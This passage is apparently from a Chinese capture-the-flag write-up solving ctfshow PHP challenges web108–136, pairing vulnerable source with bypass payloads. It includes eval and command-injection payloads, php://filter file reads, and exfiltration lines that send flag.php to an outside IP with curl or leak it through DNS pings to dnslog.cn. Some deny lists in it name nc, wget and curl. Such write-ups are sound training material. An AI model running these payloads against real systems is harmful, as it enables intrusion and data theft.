$name.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 6 echo $age; 7?\u0026gt; 其实实际上就是md5弱比较\n方法一：随便给一个值给flag，将MD5转换后的值赋给v3\nv3=1\rv1=flag=c4ca4238a0b923820dcc509a6f75849b 方法二:数组绕过\nv3[]=1\rv1=\u0026#34;flag[]=1\u0026#34; web108 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:53:55 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if (ereg (\u0026#34;^[a-zA-Z]+$\u0026#34;, $_GET[\u0026#39;c\u0026#39;])===FALSE) { 18 die(\u0026#39;error\u0026#39;); 19 20} 21//只有36d的人才能看到flag 22if(intval(strrev($_GET[\u0026#39;c\u0026#39;]))==0x36d){ 23 echo $flag; 24} 25 26?\u0026gt; 题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。\npayload\nGET:?c=a%00778 web109 考点:php原生类利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:02:34 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v1) \u0026amp;\u0026amp; preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v2)){ 20 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 21 } 22 23} 24 25?\u0026gt; 关于php原生类的利用\nhttps://blog.csdn.net/weixin_54902210/article/details/124689580\npayload:\nv1=Exception\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) or\rv1=Reflectionclass\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) 其他的原生类也行，比如Error\nweb110 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:49:10 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v1)){ 20 die(\u0026#34;error v1\u0026#34;); 21 } 22 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v2)){ 23 die(\u0026#34;error v2\u0026#34;); 24 } 25 26 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 27 28} 29 30?\u0026gt; 依旧是对php原生类的利用\n但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload\n类FilesystemIterator可以用来遍历目录，需要一个路径参数\n函数getcwd可以返回当前工作路径且不需要参数，由此可以构造payload\nhttps://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator\u0026amp;v2=getcwd 得到flag的位置,直接访问即可\nweb111 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 02:41:40 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15 16function getFlag(\u0026amp;$v1,\u0026amp;$v2){ 17 eval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;); 18 var_dump($$v1); 19} 20 21 22if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 23 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 24 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 25 26 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v1)){ 27 die(\u0026#34;error v1\u0026#34;); 28 } 29 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v2)){ 30 die(\u0026#34;error v2\u0026#34;); 31 } 32 33 if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){ 34 getFlag($v1,$v2); 35 } 36 37} 38?\u0026gt; 这题是关于变量覆盖的题目\n由于\nif(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){\rgetFlag($v1,$v2);\r} 所有我们可以确定v1的值只能为ctfshow\n接下来看getFlag函数\nfunction getFlag(\u0026amp;$v1,\u0026amp;$v2){\reval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;);\rvar_dump($$v1);\r} getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2\nvar_dump则会输出变量的相关信息\n那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag\n但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面\n所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。\n构造payload把所有全局变量全输出来\nhttps://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow\u0026amp;v2=GLOBALS web112 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:49 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#34;hacker!\u0026#34;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(!is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器\n如 php://filter（这里也用不到过滤器）\nhttps://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php 其他\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\rphp://filter/read=convert.quoted-printable-encode/resource=flag.php\rcompress.zlib://flag.php 为什么不能直接输入flag.php呢?\nif(!is_file($file)){\rhighlight_file(filter($file));\r}else{\recho \u0026#34;hacker!\u0026#34;;\r} 那是因为is_file(\u0026ldquo;flag.php\u0026rdquo;)==true，输出hacker！\nweb113 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:52 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(! is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题相比上题把filter过滤了\n我们可以考虑使用其他伪协议\n如 compress.zlib://\ncompress.zlib://flag.php 官方题解 目录溢出导致is_file认为这不是一个文件\n/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\rroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\rc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\rself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\rlf/root/proc/self/root/var/www/html/flag.php web114 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:02:53 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14function filter($file){ 15 if(preg_match(\u0026#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22echo \u0026#34;师傅们居然tql都是非预期 哼！\u0026#34;; 23if(! is_file($file)){ 24 highlight_file(filter($file)); 25}else{ 26 echo \u0026#34;hacker!\u0026#34;; 27} 这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了\nphp://filter/resource=flag.php 直接读就完事了\nweb115 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:08:19 9 10*/ 11 12include(\u0026#39;flag.php\u0026#39;); 13highlight_file(__FILE__); 14error_reporting(0); 15function filter($num){ 16 $num=str_replace(\u0026#34;0x\u0026#34;,\u0026#34;1\u0026#34;,$num); 17 $num=str_replace(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,$num); 18 $num=str_replace(\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,$num); 19 $num=str_replace(\u0026#34;e\u0026#34;,\u0026#34;1\u0026#34;,$num); 20 $num=str_replace(\u0026#34;+\u0026#34;,\u0026#34;1\u0026#34;,$num); 21 return $num; 22} 23$num=$_GET[\u0026#39;num\u0026#39;]; 24if(is_numeric($num) and $num!==\u0026#39;36\u0026#39; and trim($num)!==\u0026#39;36\u0026#39; and filter($num)==\u0026#39;36\u0026#39;){ 25 if($num==\u0026#39;36\u0026#39;){ 26 echo $flag; 27 }else{ 28 echo \u0026#34;hacker!!\u0026#34;; 29 } 30}else{ 31 echo \u0026#34;hacker!!!\u0026#34;; 32} 参考文章:ctfshow学习记录-web入门（php特性109-115\u0026amp;123\u0026amp;125-126）_ctfshow web109-CSDN博客\nis_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=\u0026lsquo;36\u0026rsquo;\n但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的\n我们这里考虑使用%0c（换页符）进行绕过\n同时使用%0c也可以绕过filter。\n接下来再看第二个if判断，这是看起来很矛盾的一个判断。\n来具体看一下!==的定义，只要类型不同就不全等。\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。 ——《php手册》语言参考-运算符-比较运算符\n也就是说!==时不进行类型转换。\n所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。\npayload：\n?num=%0c36 web123 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16$a=$_SERVER[\u0026#39;argv\u0026#39;]; 17$c=$_POST[\u0026#39;fun\u0026#39;]; 18if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 19 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?/\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=18){ 20 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 21 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 22 echo $flag; 23 } 24 } 25} 26?\u0026gt; 这题其实根本不用理会\nif($fl0g===\u0026#34;flag_give_me\u0026#34;){\recho $flag;\r} 这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag\n这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换\npayload:\nPOST:CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun= echo $flag web125 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 25?\u0026gt; 这题把上题的echo方法和flag关键词ban了\n考虑通过二次传参的方法读flag\n我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了\n后面尝试highlight_file方法成功读到flag\npayload:\nPOST CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun=highlight_file($_GET[1])\rGET 1=flag.php 其他的 payload：\n1POST CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=var_export(get_defined_vars()) web126 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\u0026#34;, $c) \u0026amp;\u0026amp; strlen($c)\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 基本上ban掉了能读文件的函数\n参考ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客\npayload:\nget：?$fl0g=flag_give_me;\rpost：CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=eval($a[0])\ror\rGET:?$fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=assert($a[0]) 这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[\u0026lsquo;fl0g\u0026rsquo;]) 仍然会返回 false，即没有检测到 fl0g 参数。\npost 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[\u0026lsquo;CTF_SHOW\u0026rsquo;]) \u0026amp;\u0026amp; isset($_POST[\u0026lsquo;CTF_SHOW.COM\u0026rsquo;]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。\n准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。\n当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[\u0026lsquo;argv\u0026rsquo;] 中。 在这种配置下，$_SERVER[\u0026lsquo;argv\u0026rsquo;][0] 包含了整个查询字符串，即 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;。\n在 eval(\u0026quot;$c;\u0026rdquo;); 中实际执行的是 eval(\u0026rsquo;eval($a[0]);\u0026rsquo;);，因为 $a[0] 是 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;，这相当于执行了 eval(\u0026rsquo;$fl0g=flag_give_me;\u0026rsquo;);，这样就定义了变量 $fl0g 并赋值为 \u0026lsquo;flag_give_me\u0026rsquo;。\n最后 判断 if($fl0g === \u0026ldquo;flag_give_me\u0026rdquo;)，因为 $fl0g 被正确地设置为了 \u0026lsquo;flag_give_me\u0026rsquo;，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。\n其他payload:\nGET:?a=1+fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=parse_str($a[1]) 也同样是为了使fl0g=flag_give_me\nweb127 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-10 21:52:49 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16$ctf_show = md5($flag); 17$url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 18 19 20//特殊字符检测 21function waf($url){ 22 if(preg_match(\u0026#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\\u0026#39;|\\\u0026#34;|\\\u0026lt;|\\,|\\\u0026gt;|\\.|\\\\\\|\\//\u0026#39;, $url)){ 23 return true; 24 }else{ 25 return false; 26 } 27} 28 29if(waf($url)){ 30 die(\u0026#34;嗯哼？\u0026#34;); 31}else{ 32 extract($_GET); 33} 34 35 36if($ctf_show===\u0026#39;ilove36d\u0026#39;){ 37 echo $flag; 38} 变量覆盖\n由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_\npayload:\nctf%20show=ilove36d web128 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-12 19:49:05 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16 17$f1 = $_GET[\u0026#39;f1\u0026#39;]; 18$f2 = $_GET[\u0026#39;f2\u0026#39;]; 19 20if(check($f1)){ 21 var_dump(call_user_func(call_user_func($f1,$f2))); 22}else{ 23 echo \u0026#34;嗯哼？\u0026#34;; 24} 25 26 27 28function check($str){ 29 return !preg_match(\u0026#39;/[0-9]|[a-z]/i\u0026#39;, $str); 30} 什么是Gettext函数\nPHP: Gettext - Manual\n骚操作\n小知识点： _()是一个函数\r_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\rget_defined_vars()函数\rget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\rpayload: ?f1=_\u0026amp;f2=get_defined_vars web129 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 03:18:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;f\u0026#39;])){ 16 $f = $_GET[\u0026#39;f\u0026#39;]; 17 if(stripos($f, \u0026#39;ctfshow\u0026#39;)\u0026gt;0){ 18 echo readfile($f); 19 } 20} stripos() 函数查找字符串在另一字符串中第一次出现的位置\n所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件\n可以联想到目录穿越\npayload:\n/ctfshow/../../../../../../../../../../var/www/html/flag.php web130 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = $_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f, \u0026#39;ctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} \u0026lsquo;/.+?ctfshow/is\u0026rsquo; 后面的i表示大小写匹配，s表示忽略换行符，单行匹配\n在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次\n所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确\n再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可\npayload\nPOST f=ctfshow web131 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = (String)$_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f,\u0026#39;36Dctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} 正则表达式溢出 https://www.laruence.com/2010/06/08/1579.html\npayload:\n#payload:\r\u0026lt;?php\recho str_repeat(\u0026#39;very\u0026#39;, \u0026#39;250000\u0026#39;).\u0026#39;36Dctfshow\u0026#39;; 不宜过多，过多会\nweb132 /admin\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 06:22:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 20:05:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14#error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18 19if(isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;code\u0026#39;])){ 20 $username = (String)$_GET[\u0026#39;username\u0026#39;]; 21 $password = (String)$_GET[\u0026#39;password\u0026#39;]; 22 $code = (String)$_GET[\u0026#39;code\u0026#39;]; 23 24 if($code === mt_rand(1,0x36D) \u0026amp;\u0026amp; $password === $flag || $username ===\u0026#34;admin\u0026#34;){ 25 26 if($code == \u0026#39;admin\u0026#39;){ 27 echo $flag; 28 } 29 30 } 31} 第一个判断后面用的是或\n也就是说只要使username等于admin即可，前面两个无所谓了\n第二个判断让code等于admin即可\npayload：\nGET:?code=admin\u0026amp;username=admin\u0026amp;password= web133 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 16:43:44 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14//flag.php 15if($F = @$_GET[\u0026#39;F\u0026#39;]){ 16 if(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|netcat/i\u0026#39;, $F)){ 17 eval(substr($F,0,6)); 18 }else{ 19 die(\u0026#34;6个字母都还不够呀?!\u0026#34;); 20 } 21} ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园\n这其实是一道关于变量覆盖的题目\nget传参 F=`$F `;sleep 3\r经过substr($F,0,6)截取后 得到 `$F `;\r也就是会执行 eval(\u0026#34;`$F `;\u0026#34;);\r我们把原来的$F带进去\reval(\u0026#34;``$F `;sleep 3`\u0026#34;);\r也就是说最终会执行 ` `$F `;sleep 3 ` == shell_exec(\u0026#34;`$F `;sleep 3\u0026#34;);\r前面的命令我们不需要管，但是后面的命令我们可以自由控制。\r这样就在服务器上成功执行了 sleep 3\r所以 最后就是一道无回显的RCE题目了 payload:\n`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/ curl外带rce\nweb134 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-14 23:01:06 9 10*/ 11 12highlight_file(__FILE__); 13$key1 = 0; 14$key2 = 0; 15if(isset($_GET[\u0026#39;key1\u0026#39;]) || isset($_GET[\u0026#39;key2\u0026#39;]) || isset($_POST[\u0026#39;key1\u0026#39;]) || isset($_POST[\u0026#39;key2\u0026#39;])) { 16 die(\u0026#34;nonononono\u0026#34;); 17} 18@parse_str($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); 19extract($_POST); 20if($key1 == \u0026#39;36d\u0026#39; \u0026amp;\u0026amp; $key2 == \u0026#39;36d\u0026#39;) { 21 die(file_get_contents(\u0026#39;flag.php\u0026#39;)); 22} 看到extract想起变量覆盖\nextract($_POST);\r//提取$_POST数组 payload:\n?_POST[key1]=36d\u0026amp;_POST[key2]=36d web135 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: Firebasky\r# @Date: 2020-10-13 11:25:09\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-10-16 18:48:03\r*/\rerror_reporting(0);\rhighlight_file(__FILE__);\r//flag.php\rif($F = @$_GET[\u0026#39;F\u0026#39;]){\rif(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i\u0026#39;, $F)){\reval(substr($F,0,6));\r}else{\rdie(\u0026#34;师傅们居然破解了前面的，那就来一个加强版吧\u0026#34;);\r}\r} 133plus\n这题ban了很多命令\n但是没ban nl,mv，可以用nl和cp把flag写到其他文件中\npayload:\n`$F `;nl f*\u0026gt;1.txt\r`$F `;mv f*\u0026gt;1.txt 这题也可以用ping进行外带\n`$F`;+ping `cat flag.php|awk \u0026#39;NR==2\u0026#39;`.6x1sys.dnslog.cn\r#通过ping命令去带出数据，然后awk NR一排一排的获得数据 web136 1\u0026lt;?php 2error_reporting(0); 3function check($x){ 4 if(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){ 5 